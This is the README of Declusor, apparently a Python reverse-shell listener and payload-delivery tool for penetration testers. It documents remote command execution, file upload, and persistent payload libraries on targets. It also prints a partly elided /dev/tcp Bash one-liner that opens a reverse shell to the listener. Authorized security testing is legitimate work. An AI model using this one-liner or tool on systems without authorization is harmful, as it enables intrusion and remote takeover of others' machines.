# Declusor: A Remote Control and Payload Delivery Client

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
![Python 3.x](https://img.shields.io/badge/python-3.x-blue.svg)

**Declusor** is a fast, flexible, and modular Python tool built for penetration testers, CTF players, and security professionals. It streamlines payload delivery and provides reliable remote control through a unified, interactive CLI.

Its intelligent command-line interface boosts productivity with smart command and path completion, while supporting remote command execution, interactive sessions, payload management, and file transfers — all in one place.

[![Declusor Capabilities Demonstration](https://i.imgur.com/BwmiGK3.gif)](https://asciinema.org/a/e3f2q9TH9q7QylDBpHPy6Deme)

> [!WARNING]
> **Legal Notice**: This software is intended solely for educational use and authorized security research. The developers assume no liability for any misuse or unlawful activity carried out with this tool. Executing this software on networks or systems without ownership or explicit, written authorization for any form of testing or operation is strictly prohibited.

## Features

- **Shell Management**: Establish, maintain, and interact with remote shell sessions.
- **Command Execution**: Execute arbitrary commands on the remote system with output captured by the client.
- **Interactive Shell**: Open a full interactive shell session for seamless interaction with the remote environment.
- **File Uploads**: Transfer files from the local machine to the remote target.
- **Payload Loading**: Load and execute shell scripts or other payloads from local files on the remote system.
- **Local Command Completion**: Features a custom command-line completer for easy navigation and command input, suggesting available commands and local file paths.

## Technical Architecture

Declusor is built with a modular design focusing on reliability and maintainability, structured around key components:

- **Connection Management**: Handles the underlying network communication and data transfer between the client and target, ensuring robust session stability.
- **Command Processing**: Interprets user commands and dispatches them to specialized modules for execution, enabling diverse remote operations.
- **Module System**: Provides a flexible and extensible framework for integrating new functionalities and commands, enhancing Declusor's adaptability.
- **User Interface**: Manages the interactive command-line experience, including intelligent command and file path completion for improved usability.

## Getting Started

### Prerequisites

- **Python 3.x**: Ensure you have Python 3 installed on your local machine.
- **Unix‑like Operating System (Target)**: Declusor relies on some features which are standard on Linux, macOS, and other Unix‑like systems on the target machine.

### Installation

Clone the Declusor repository to your local machine:

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor
chmod 700 ./declusor
```

No additional Python packages are required beyond the standard library.

### Quick Start

```bash
# Start the listener (replace IP and PORT as needed)
./declusor 127.0.0.1 4444
```

The client will output a Bash one‑liner. Execute that one‑liner on the target machine to establish the reverse shell.

## Usage

### Starting the Listener (Declusor Client)

Run the script with the desired IP and port:

```
./declusor <LISTENER_IP> <LISTENER_PORT>
```

**Example:**

```bash
./declusor 127.0.0.1 4444
```

After starting the listener, Declusor prints a Bash one‑liner. This command needs to be executed on the target machine to establish the reverse shell connection back to the Declusor client.

### Establishing the Reverse Shell (Target Machine)

Copy the printed one‑liner and run it on the target machine:

```bash
( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3 >&3 2>&3 )
```

### Interacting with the Target

When the reverse shell is active, Declusor shows a `[declusor]` prompt.

```
[declusor] help
load    : Load a payload file from your local system and execute it on the remote system
command : Execute a single command on the remote system.
shell   : Initiate an interactive shell session on the remote system.
upload  : Upload a file from the local system to the remote system.
execute : Execute a program or script from the local system on the remote system.
help    : Display detailed information about available commands or a specific command.
exit    : Terminate the session and exit the program.
[declusor] load discovery/dev_tools.sh

DEVELOPMENT TOOLS
-----------------
/usr/bin/nc
/usr/bin/netcat
/usr/bin/gcc
/usr/bin/wget
/usr/bin/curl
```

## Customizing and Extending Payloads

To fully leverage `declusor`, you can create custom payloads or modify the existing ones. Start by exploring the `data` directory, which contains key subdirectories: `library` and `modules`.

- **`data/library/`**: This folder contains scripts that are automatically sent to the target immediately after a connection is established. These scripts are intended to persist in the target's memory, effectively allowing the target to "remember" the subroutines. Once stored, these subroutines can be used repeatedly in combination with your payloads.
- **`data/modules/`**: This folder holds scripts that the target executes on demand, organized into categories. The output from these scripts is sent back to your server (or your prompt). The `load` command automatically scans this folder for available files and directories, simplifying the process of incorporating them into your payloads.

## Contributing

Contributions are highly encouraged and welcome! We prioritize clarity, correctness, and modularity in the codebase.

**Areas for contribution include:**

- **New Command Handlers**: Extend Declusor's functionality by adding new commands (e.g., for specific reconnaissance, privilege escalation, or post-exploitation tasks).
- **Payload Development**: Create new scripts for the `data/library/` (persistent subroutines) or `data/modules/` (on-demand execution) directories.
- **Cross-Platform Compatibility**: Enhance support for different operating systems, especially for the target-side one-liner or client-side execution.
- **Documentation & Examples**: Improve existing documentation, add more detailed usage examples, or create tutorials.
- **Bug Fixes & Robustness**: Identify and fix bugs, improve error handling, or enhance the stability of network communications.
- **Code Refactoring & Clarity**: Improve code readability, maintainability, and adherence to best practices.
- **Test Coverage**: Expand unit and integration tests to ensure reliability.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
